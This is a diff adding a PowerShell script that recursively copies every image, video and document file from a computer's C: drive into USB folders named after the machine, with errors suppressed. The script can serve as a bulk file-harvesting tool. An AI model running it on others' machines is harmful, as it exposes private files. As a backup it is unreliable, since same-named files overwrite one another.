@@ -1,0 +1,47 @@
+# Define the USB path
+$usbPath = "E:\Path\To\Usb\Drive"  # Adjust this to the correct path of the mounted USB drive
+
+# Define the extensions
+$imageExtensions = @("*.png", "*.jpg", "*.jpeg", "*.gif", "*.bmp", "*.tiff")
+$videoExtensions = @("*.mp4", "*.avi", "*.mov", "*.mkv", "*.flv")
+$documentExtensions = @("*.pdf", "*.doc", "*.docx", "*.xls", "*.xlsx", "*.ppt", "*.pptx", "*.txt")
+
+# Get computer name
+$computerName = $env:COMPUTERNAME
+
+# Create folders on the USB drive
+$imageFolder = Join-Path $usbPath "${computerName}_images"
+$videoFolder = Join-Path $usbPath "${computerName}_videos"
+$documentFolder = Join-Path $usbPath "${computerName}_documents"
+
+New-Item -ItemType Directory -Force -Path $imageFolder
+New-Item -ItemType Directory -Force -Path $videoFolder
+New-Item -ItemType Directory -Force -Path $documentFolder
+
+# Function to copy files
+function Copy-Files {
+    param (
+        [string[]]$extensions,
+        [string]$destFolder
+    )
+    foreach ($ext in $extensions) {
+        Get-ChildItem -Path C:\ -Recurse -Filter $ext -ErrorAction SilentlyContinue | ForEach-Object {
+            Copy-Item -Path $_.FullName -Destination $destFolder -Force
+            Write-Output "Copied $($_.FullName) to $destFolder"
+        }
+    }
+}
+
+# Copy images
+Write-Output "Copying images..."
+Copy-Files -extensions $imageExtensions -destFolder $imageFolder
+
+# Copy videos
+Write-Output "Copying videos..."
+Copy-Files -extensions $videoExtensions -destFolder $videoFolder
+
+# Copy documents
+Write-Output "Copying documents..."
+Copy-Files -extensions $documentExtensions -destFolder $documentFolder
+
+Write-Output "All files have been copied successfully."
